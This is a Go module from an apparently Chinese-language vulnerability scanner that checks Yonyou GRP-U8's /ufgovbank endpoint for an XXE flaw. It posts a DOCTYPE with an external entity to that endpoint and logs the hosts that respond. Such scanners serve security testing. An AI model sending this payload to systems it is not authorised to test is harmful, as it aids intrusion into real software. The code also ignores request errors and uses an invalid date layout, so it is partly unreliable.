package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func UfgovbankScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	ufgovbank := "用友 GRP-U8 ufgovbank XXE漏洞"
	urls := address + "/ufgovbank"
	client.Timeout = 8 * time.Second
	response, _ := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("reqData=<?xml version=\"1.0\"?>\n<!DOCTYPE foo SYSTEM \"http://www.baidu.com\">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest"))
	defer response.Body.Close()
	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "ufgov") || strings.Contains(string(body), "lineNumber") {
		result := ufgovbank + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, ufgovbank, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, ufgovbank)
		fmt.Println(output)
	}
}
